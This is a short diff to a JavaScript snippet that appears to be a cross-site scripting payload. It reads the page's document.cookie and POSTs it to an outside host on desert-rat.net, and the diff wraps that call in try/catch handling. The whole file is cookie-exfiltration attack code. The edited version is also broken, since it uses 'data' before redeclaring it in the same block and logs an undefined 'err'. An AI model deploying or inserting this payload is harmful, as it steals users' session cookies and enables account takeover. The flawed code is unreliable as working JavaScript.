@@ -5,9 +5,19 @@ console.log(document.domain);
 
 let data = document.cookie;
 
-const response = await fetch("https://dam5j34p92lis85gpj50s511hyt4rua9u.desert-rat.net", {
-  method: "POST",
-  body: data
-  //body: JSON.stringify({ username: "example" }),
-  // …
-});
+try{
+    const response = await fetch("https://dam5j34p92lis85gpj50s511hyt4rua9u.desert-rat.net", {
+        method: "POST",
+        body: data
+    });
+
+    if (!response.ok) {
+        const message = 'Error with Status Code: ' + response.status;
+        throw new Error(message);
+    }
+
+    const data = await response.json();
+    console.log(data);
+} catch (error) {
+    console.log('Error: ' + err)
+}
